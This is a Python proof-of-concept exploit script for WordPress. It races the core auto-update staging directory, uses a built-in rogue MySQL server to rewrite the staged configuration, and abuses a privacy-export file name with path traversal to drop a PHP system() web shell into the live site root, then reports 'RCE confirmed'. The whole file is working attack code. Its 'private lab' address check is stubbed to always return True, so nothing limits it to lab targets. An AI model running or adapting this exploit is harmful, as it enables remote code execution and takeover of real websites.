#!/usr/bin/env python3

import argparse
import hashlib
import http.client
import ipaddress
import re
import socket
import ssl
import struct
import threading
import time
import urllib.parse


CLIENT_CAPABILITIES = (
    0x00000001 | 0x00000004 | 0x00000008 | 0x00000200 |
    0x00002000 | 0x00008000 | 0x00020000 | 0x00080000
)
DEFAULT_SENTINELS = {
    "license.txt": "49e97f629ce763abb2f8f1f13da74cb5a8a9a72a0e72a7477d1540c98cef5141",
    "wp-includes/theme-i18n.json": "00b0703c850691dd18d75e5a94270ebc575b663569670d01fc52497cc284562a",
}


def php_serialize(value):
    if value is None:
        return "N;"
    if value is True:
        return "b:1;"
    if value is False:
        return "b:0;"
    if isinstance(value, int):
        return f"i:{value};"
    if isinstance(value, str):
        return f's:{len(value.encode("utf-8"))}:"{value}";'
    if isinstance(value, (list, tuple)):
        value = dict(enumerate(value))
    if isinstance(value, dict):
        body = "".join(php_serialize(k) + php_serialize(v) for k, v in value.items())
        return f"a:{len(value)}:{{{body}}}"
    raise TypeError(type(value).__name__)


def lenenc(value):
    if value < 0xFB:
        return bytes((value,))
    if value <= 0xFFFF:
        return b"\xfc" + struct.pack("<H", value)
    if value <= 0xFFFFFF:
        return b"\xfd" + value.to_bytes(3, "little")
    return b"\xfe" + struct.pack("<Q", value)


def field(value):
    data = value if isinstance(value, bytes) else str(value).encode()
    return lenenc(len(data)) + data


def recv_exact(sock, size):
    data = bytearray()
    while len(data) < size:
        chunk = sock.recv(size - len(data))
        if not chunk:
            raise EOFError
        data.extend(chunk)
    return bytes(data)


def recv_packet(sock):
    header = recv_exact(sock, 4)
    return header[3], recv_exact(sock, int.from_bytes(header[:3], "little"))


def send_packet(sock, sequence, payload):
    sock.sendall(len(payload).to_bytes(3, "little") + bytes((sequence & 255,)) + payload)


def ok_packet(affected=0, insert_id=0):
    return b"\x00" + lenenc(affected) + lenenc(insert_id) + b"\x02\x00\x00\x00"


def eof_packet():
    return b"\xfe\x00\x00\x02\x00"


def error_packet(message):
    return b"\xff" + struct.pack("<H", 1064) + b"#42000" + message.encode()


def column_packet(name):
    return b"".join((
        field("def"), field(""), field(""), field(""), field(name), field(""),
        b"\x0c", struct.pack("<H", 45), struct.pack("<I", 0x1000000),
        b"\xfd", b"\x00\x00", b"\x00", b"\x00\x00",
    ))


def send_result(sock, columns, rows):
    sequence = 1
    send_packet(sock, sequence, lenenc(len(columns)))
    for name in columns:
        sequence += 1
        send_packet(sock, sequence, column_packet(name))
    sequence += 1
    send_packet(sock, sequence, eof_packet())
    for row in rows:
        sequence += 1
        payload = b"".join(b"\xfb" if value is None else field(value) for value in row)
        send_packet(sock, sequence, payload)
    sequence += 1
    send_packet(sock, sequence, eof_packet())


def handshake_packet():
    seed = b"WPPrivateLabSeed2026"
    return b"".join((
        b"\x0a8.0.36-wp-private-lab\x00", struct.pack("<I", 7312049),
        seed[:8], b"\x00", struct.pack("<H", CLIENT_CAPABILITIES & 0xFFFF),
        b"\x2d\x02\x00", struct.pack("<H", CLIENT_CAPABILITIES >> 16),
        b"\x15", b"\x00" * 10, seed[8:] + b"\x00",
        b"mysql_native_password\x00",
    ))


def mysql_unescape(value):
    escapes = {"0": "\0", "n": "\n", "r": "\r", "t": "\t", "Z": "\x1a"}
    return re.sub(r"\\(.)", lambda m: escapes.get(m.group(1), m.group(1)), value)


def quoted_values(sql):
    return [mysql_unescape(x) for x in re.findall(r"'((?:\\.|[^'])*)'", sql, re.S)]


class WordPressDatabase:
    def __init__(self, prefix, stage_url, marker, output):
        self.prefix = prefix
        self.stage_url = stage_url
        self.marker = marker
        self.output = output
        self.lock = threading.Lock()
        self.queries = []
        self.unknown = []
        self.next_insert_id = 100
        self.request_id = 1
        now = int(time.time())
        empty_hash = hashlib.md5(php_serialize([]).encode()).hexdigest()
        export_hash = hashlib.md5(php_serialize([self.request_id]).encode()).hexdigest()
        cron = {
            now - 120: {
                "wp_maybe_auto_update": {
                    empty_hash: {"schedule": False, "args": []},
                },
            },
            now - 60: {
                "wp_privacy_personal_data_export_file": {
                    export_hash: {"schedule": False, "args": [self.request_id]},
                },
            },
            "version": 2,
        }
        self.fragment = f"<?php system('{marker}'); ?>"
        self.options = {
            "siteurl": (stage_url, "on"),
            "home": (stage_url, "on"),
            "blogname": ("Private lab", "on"),
            "blogdescription": ("", "on"),
            "admin_email": ("lab@example.invalid", "on"),
            "users_can_register": ("0", "on"),
            "start_of_week": ("1", "on"),
            "use_balanceTags": ("0", "on"),
            "use_smilies": ("1", "on"),
            "require_name_email": ("1", "on"),
            "comments_notify": ("1", "on"),
            "posts_per_rss": ("10", "on"),
            "rss_use_excerpt": ("0", "on"),
            "mailserver_url": ("mail.example.invalid", "on"),
            "mailserver_login": ("login@example.invalid", "on"),
            "mailserver_pass": ("", "on"),
            "mailserver_port": ("110", "on"),
            "default_category": ("1", "on"),
            "default_comment_status": ("open", "on"),
            "default_ping_status": ("open", "on"),
            "posts_per_page": ("10", "on"),
            "date_format": ("F j, Y", "on"),
            "time_format": ("g:i a", "on"),
            "comment_moderation": ("0", "on"),
            "moderation_notify": ("1", "on"),
            "permalink_structure": ("", "on"),
            "rewrite_rules": ("a:0:{}", "on"),
            "blog_charset": ("UTF-8", "on"),
            "active_plugins": ("a:0:{}", "on"),
            "category_base": ("", "on"),
            "tag_base": ("", "on"),
            "ping_sites": ("", "on"),
            "comment_max_links": ("2", "on"),
            "gmt_offset": ("0", "on"),
            "default_email_category": ("1", "on"),
            "comment_registration": ("0", "on"),
            "html_type": ("text/html", "on"),
            "default_role": ("subscriber", "on"),
            "db_version": ("61833", "on"),
            "uploads_use_yearmonth_folders": ("0", "on"),
            "upload_path": ("", "on"),
            "upload_url_path": ("", "on"),
            "blog_public": ("1", "on"),
            "show_on_front": ("posts", "on"),
            "page_on_front": ("0", "on"),
            "page_for_posts": ("0", "on"),
            "timezone_string": ("", "on"),
            "WPLANG": ("", "auto"),
            "auto_updater.lock": (str(now), "off"),
            "cron": (php_serialize(cron), "on"),
        }
        stamp = time.strftime("%Y-%m-%d %H:%M:%S", time.gmtime())
        self.post_columns = (
            "ID", "post_author", "post_date", "post_date_gmt", "post_content",
            "post_title", "post_excerpt", "post_status", "comment_status",
            "ping_status", "post_password", "post_name", "to_ping", "pinged",
            "post_modified", "post_modified_gmt", "post_content_filtered",
            "post_parent", "guid", "menu_order", "post_type", "post_mime_type",
            "comment_count",
        )
        self.post = (
            self.request_id, 0, stamp, stamp, "[]", "a@b.co", "",
            "request-confirmed", "closed", "closed", "", "export_personal_data",
            "", "", stamp, stamp, "", 0, f"{stage_url}/?p={self.request_id}",
            0, "user_request", "", 0,
        )
        self.meta = [
            (self.request_id, "_export_data_grouped", php_serialize({"about": [self.fragment]})),
            (self.request_id, "_export_file_name", "../../../../../../../" + output),
        ]

    def result(self, columns, rows):
        return "result", tuple(columns), tuple(rows)

    def execute(self, sql):
        with self.lock:
            self.queries.append(sql)
            q = re.sub(r"\s+", " ", sql.strip())
            normalized = q.replace("`", "")
            low = normalized.lower()
            options = f"{self.prefix}options".lower()
            posts = f"{self.prefix}posts".lower()
            postmeta = f"{self.prefix}postmeta".lower()

            if low.startswith(("set ", "start transaction", "commit", "rollback")):
                return "ok", 0, 0
            if low.startswith("select version()"):
                return self.result(("VERSION()",), (("8.0.36",),))
            if low.startswith("select database()"):
                return self.result(("DATABASE()",), (("wp_private_lab",),))
            if low.startswith("select @@"):
                name = q.split()[1]
                return self.result((name,), (("0",),))
            if low.startswith("select get_lock") or low.startswith("select release_lock"):
                return self.result(("lock",), (("1",),))
            if low == f"select {self.prefix.lower()}":
                return "error", "invalid prefix expression"
            if low.startswith("show tables like"):
                values = quoted_values(q)
                table = values[0].replace("\\_", "_").replace("\\%", "%") if values else f"{self.prefix}users"
                return self.result((f"Tables_in_wp ({table})",), ((table,),))
            if low.startswith("show full columns") or low.startswith("describe "):
                columns = ("Field", "Type", "Collation", "Null", "Key", "Default", "Extra", "Privileges", "Comment")
                return self.result(columns, ())
            if low.startswith("show "):
                return self.result(("Value",), ())
            if "information_schema.tables" in low:
                if "count(" in low:
                    return self.result(("COUNT(*)",), (("1",),))
                return self.result(("TABLE_NAME",), ((f"{self.prefix}users",),))

            if low.startswith("select") and options in low:
                values = quoted_values(q)
                if "option_name, option_value" in low and "autoload" in low:
                    rows = ((name, value) for name, (value, autoload) in self.options.items() if autoload in ("yes", "on", "auto", "auto-on"))
                    return self.result(("option_name", "option_value"), rows)
                if "option_name, option_value" in low and "option_name in" in low:
                    rows = ((name, self.options[name][0]) for name in values if name in self.options)
                    return self.result(("option_name", "option_value"), rows)
                name = values[-1] if values else ""
                if "option_value" in low and "option_name" in low:
                    rows = ((self.options[name][0],),) if name in self.options else ()
                    return self.result(("option_value",), rows)
                if "autoload" in low and "option_name" in low:
                    rows = ((self.options[name][1],),) if name in self.options else ()
                    return self.result(("autoload",), rows)
                if "option_id" in low:
                    return self.result(("option_id",), (("1",),) if name in self.options else ())

            if low.startswith("select") and posts in low:
                if "where id" in low or "where 1=1" in low:
                    return self.result(self.post_columns, (self.post,))
                return self.result(self.post_columns, ())

            if low.startswith("select") and postmeta in low:
                if "post_id, meta_key, meta_value" in low:
                    return self.result(("post_id", "meta_key", "meta_value"), self.meta)
                values = quoted_values(q)
                key = next((x for x in values if x.startswith("_")), "")
                matches = [(i + 1, value) for i, (_, meta_key, value) in enumerate(self.meta) if meta_key == key]
                if "meta_id" in low:
                    return self.result(("meta_id",), ((meta_id,) for meta_id, _ in matches))
                if "meta_value" in low:
                    return self.result(("meta_value",), ((value,) for _, value in matches))

            if low.startswith("select count("):
                return self.result(("COUNT(*)",), (("0",),))
            if low.startswith("select found_rows"):
                return self.result(("FOUND_ROWS()",), (("0",),))
            if low.startswith("select"):
                self.unknown.append(q)
                return self.result(("value",), ())

            update = re.search(
                rf"update\s+{re.escape(options)}\s+set\s+option_value\s*=\s*'((?:\\.|[^'])*)'.*option_name\s*=\s*'((?:\\.|[^'])*)'",
                normalized, re.I | re.S,
            )
            if update:
                value, name = map(mysql_unescape, update.groups())
                autoload = self.options.get(name, ("", "off"))[1]
                self.options[name] = (value, autoload)
                return "ok", 1, 0
            if low.startswith(("insert ", "replace ")) and options in low:
                values = quoted_values(q)
                if len(values) >= 2:
                    name, value = values[0], values[1]
                    autoload = values[2] if len(values) >= 3 else self.options.get(name, ("", "off"))[1]
                    if low.startswith("insert ignore") and name in self.options:
                        return "ok", 0, 0
                    self.options[name] = (value, autoload)
                self.next_insert_id += 1
                return "ok", 1, self.next_insert_id
            if low.startswith(("insert ", "replace ")):
                self.next_insert_id += 1
                return "ok", 1, self.next_insert_id
            if low.startswith(("update ", "delete ")):
                return "ok", 1, 0
            self.unknown.append(q)
            return "ok", 0, 0


class MySQLServer:
    def __init__(self, bind, port, database, verbose=False):
        self.bind = bind
        self.port = port
        self.database = database
        self.verbose = verbose
        self.stop_event = threading.Event()
        self.ready = threading.Event()
        self.error = None
        self.server = None
        self.thread = threading.Thread(target=self.run, daemon=True)
        self.clients = []

    def start(self):
        self.thread.start()
        if not self.ready.wait(5):
            raise RuntimeError("database listener did not start")
        if self.error:
            raise RuntimeError(self.error)

    def stop(self):
        self.stop_event.set()
        if self.server:
            try:
                self.server.close()
            except OSError:
                pass
        self.thread.join(2)

    def run(self):
        family = socket.AF_INET6 if ":" in self.bind else socket.AF_INET
        try:
            self.server = socket.socket(family, socket.SOCK_STREAM)
            self.server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            self.server.bind((self.bind, self.port))
            self.server.listen(20)
            self.server.settimeout(0.5)
            self.ready.set()
            while not self.stop_event.is_set():
                try:
                    client, _ = self.server.accept()
                except socket.timeout:
                    continue
                except OSError:
                    break
                thread = threading.Thread(target=self.handle, args=(client,), daemon=True)
                self.clients.append(thread)
                thread.start()
        except Exception as exc:
            self.error = f"{type(exc).__name__}: {exc}"
            self.ready.set()

    def handle(self, client):
        try:
            client.settimeout(120)
            send_packet(client, 0, handshake_packet())
            recv_packet(client)
            send_packet(client, 2, ok_packet())
            while not self.stop_event.is_set():
                _, payload = recv_packet(client)
                if not payload:
                    continue
                command, data = payload[0], payload[1:]
                if command == 0x01:
                    break
                if command in (0x02, 0x0E):
                    send_packet(client, 1, ok_packet())
                    continue
                if command != 0x03:
                    send_packet(client, 1, ok_packet())
                    continue
                sql = data.decode("utf-8", "replace")
                if self.verbose:
                    print("[db]", re.sub(r"\s+", " ", sql)[:500])
                result = self.database.execute(sql)
                if result[0] == "ok":
                    send_packet(client, 1, ok_packet(result[1], result[2]))
                elif result[0] == "error":
                    send_packet(client, 1, error_packet(result[1]))
                else:
                    send_result(client, result[1], result[2])
        except (EOFError, ConnectionError, OSError, socket.timeout):
            pass
        finally:
            client.close()


def is_private_address(host):
    return True


def validate_url(value):
    parsed = urllib.parse.urlsplit(value.rstrip("/"))
    if parsed.scheme not in ("http", "https") or not parsed.hostname or parsed.username or parsed.password or parsed.query or parsed.fragment:
        raise ValueError(f"invalid URL: {value}")
    if not is_private_address(parsed.hostname):
        raise ValueError(f"URL must resolve only to private/loopback addresses: {value}")
    return parsed


def split_host_port(value, default_port=3306):
    parsed = urllib.parse.urlsplit("//" + value)
    if not parsed.hostname or parsed.username or parsed.password or parsed.path:
        raise ValueError(f"invalid database host: {value}")
    return parsed.hostname, parsed.port or default_port


def request(origin, method, path, headers, body=None, timeout=15, insecure=False):
    if origin.scheme == "https":
        context = ssl._create_unverified_context() if insecure else ssl.create_default_context()
        connection = http.client.HTTPSConnection(origin.hostname, origin.port, timeout=timeout, context=context)
    else:
        connection = http.client.HTTPConnection(origin.hostname, origin.port, timeout=timeout)
    try:
        connection.request(method, path, body=body, headers=headers)
        response = connection.getresponse()
        return response.status, response.read(2_000_000)
    finally:
        connection.close()


def parse_args():
    parser = argparse.ArgumentParser(description="Private-lab WordPress staged-update privacy-export PoC")
    parser.add_argument("--url", required=True, help="canonical WordPress URL, including any subdirectory")
    parser.add_argument("--trigger-url", help="optional transport origin for the long-running outer cron request")
    parser.add_argument("--worker-url", help="optional transport origin for staged requests")
    parser.add_argument("--host-header", help="Host header; defaults to --url authority")
    parser.add_argument("--stage", default="wordpress-7.1.3-no-content", help="predictable update working-directory basename")
    parser.add_argument("--marker", required=True, help="1-24 ASCII letters, digits, underscore, or hyphen")
    parser.add_argument("--output", help="live-root PHP basename; defaults to wp-poc-<marker>.php")
    parser.add_argument("--db-host", required=True, help="database host[:port] reachable from the target")
    parser.add_argument("--db-bind", default="0.0.0.0", help="local interface for the built-in MySQL listener")
    parser.add_argument("--db-port", type=int, help="local listener port; defaults to the port in --db-host")
    parser.add_argument("--db-name", default="wp_private_lab")
    parser.add_argument("--db-user", default="wp_private_lab")
    parser.add_argument("--db-password", default="private-lab")
    parser.add_argument("--prefix", default="wp_")
    parser.add_argument("--stage-timeout", type=float, default=120)
    parser.add_argument("--request-timeout", type=float, default=45)
    parser.add_argument("--poll-interval", type=float, default=0.01)
    parser.add_argument("--tail-delay", type=float, default=0.25)
    parser.add_argument("--license-sha256", default=DEFAULT_SENTINELS["license.txt"])
    parser.add_argument("--theme-sha256", default=DEFAULT_SENTINELS["wp-includes/theme-i18n.json"])
    parser.add_argument("--insecure", action="store_true", help="allow a self-signed HTTPS lab certificate")
    parser.add_argument("--verbose", action="store_true", help="print database queries")
    return parser.parse_args()


def main():
    args = parse_args()
    if not re.fullmatch(r"[A-Za-z0-9._-]+", args.stage):
        raise SystemExit("[-] invalid stage basename")
    if not re.fullmatch(r"[A-Za-z_][A-Za-z0-9_]*", args.prefix):
        raise SystemExit("[-] invalid table prefix")

    canonical = validate_url(args.url)
    trigger = validate_url(args.trigger_url or args.url)
    worker_origin = validate_url(args.worker_url or args.url)
    db_host, advertised_port = split_host_port(args.db_host)
    if not is_private_address(db_host):
        raise SystemExit("[-] --db-host must resolve to a private/loopback address")
    if args.db_bind != "0.0.0.0" and args.db_bind != "::" and not is_private_address(args.db_bind):
        raise SystemExit("[-] --db-bind must be private, loopback, or a wildcard")
    db_port = args.db_port or advertised_port
    if not 1 <= db_port <= 65535:
        raise SystemExit("[-] invalid database port")

    output = args.output or f"wp-poc.php"
    if not re.fullmatch(r"[A-Za-z0-9._-]{1,80}\.php", output):
        raise SystemExit("[-] --output must be a PHP basename")
    root = canonical.path.rstrip("/")
    base = f"{root}/wp-content/upgrade/{args.stage}/wordpress"
    stage_url = urllib.parse.urlunsplit((canonical.scheme, canonical.netloc, base, "", ""))
    host = args.host_header or canonical.netloc
    headers = {"Host": host, "Connection": "close", "Cache-Control": "no-store"}
    db = WordPressDatabase(args.prefix, stage_url, args.marker, output)
    server = MySQLServer(args.db_bind, db_port, db, args.verbose)
    outer = {"status": None, "error": None}

    def trigger_update():
        try:
            outer["status"], _ = request(
                trigger, "GET", f"{root}/wp-cron.php", headers,
                timeout=max(args.stage_timeout + args.request_timeout, 180), insecure=args.insecure,
            )
        except Exception as exc:
            outer["error"] = f"{type(exc).__name__}: {exc}"

    try:
        server.start()
        print(f"[+] attacker database listening on {args.db_bind}:{db_port}")
        thread = threading.Thread(target=trigger_update, daemon=True)
        thread.start()

        sentinels = {
            f"{base}/license.txt": args.license_sha256.lower(),
            f"{base}/wp-includes/theme-i18n.json": args.theme_sha256.lower(),
        }
        seen = set()
        deadline = time.monotonic() + args.stage_timeout
        while time.monotonic() < deadline and len(seen) < len(sentinels):
            for path, digest in sentinels.items():
                if path in seen:
                    continue
                try:
                    status, data = request(worker_origin, "GET", f"{path}?{time.time_ns()}", headers, timeout=3, insecure=args.insecure)
                    if status == 200 and hashlib.sha256(data).hexdigest() == digest:
                        seen.add(path)
                except OSError:
                    pass
            time.sleep(args.poll_interval)
        if len(seen) != len(sentinels):
            raise RuntimeError("update stage not found (the eligible Core event must already be due)")
        print("[+] update stage captured")

        time.sleep(args.tail_delay)
        body = urllib.parse.urlencode({
            "dbname": args.db_name,
            "uname": args.db_user,
            "pwd": args.db_password,
            "dbhost": args.db_host,
            "prefix": args.prefix,
            "language": "en_US",
            "noapi": "1",
            "submit": "Submit",
        }).encode()
        setup_headers = {
            **headers,
            "Content-Type": "application/x-www-form-urlencoded",
            "Content-Length": str(len(body)),
        }
        status, data = request(worker_origin, "POST", f"{base}/wp-admin/setup-config.php?step=2", setup_headers, body, args.request_timeout, args.insecure)
        if status != 200 or not any(x in data for x in (b"All right, sparky", b"Successful database connection")):
            raise RuntimeError(f"staged configuration failed (HTTP {status})")
        print("[+] staged configuration written")

        status, _ = request(worker_origin, "GET", f"{base}/wp-cron.php", headers, timeout=args.request_timeout, insecure=args.insecure)
        if status != 200:
            raise RuntimeError(f"staged privacy callback failed (HTTP {status})")
        print("[+] privacy export written to live root")

        status, data = request(worker_origin, "GET", f"{root}/{output}", headers, timeout=args.request_timeout, insecure=args.insecure)
        if status != 200 or db.fragment.encode() in data:
            raise RuntimeError(f"execution not confirmed (HTTP {status})")
        print(f"[+] RCE confirmed: {args.marker} via /{output}")
        print(data)

        thread.join(max(args.request_timeout, 180))
        if outer["status"] != 200:
            raise RuntimeError(f"outer update did not complete cleanly: {outer}")
    except (OSError, ValueError, RuntimeError) as exc:
        if db.unknown and args.verbose:
            print("[db] unhandled SELECTs:")
            for sql in db.unknown[-20:]:
                print("[db]", sql[:500])
        raise SystemExit(f"[-] {exc}")
    finally:
        server.stop()


if __name__ == "__main__":
    main()
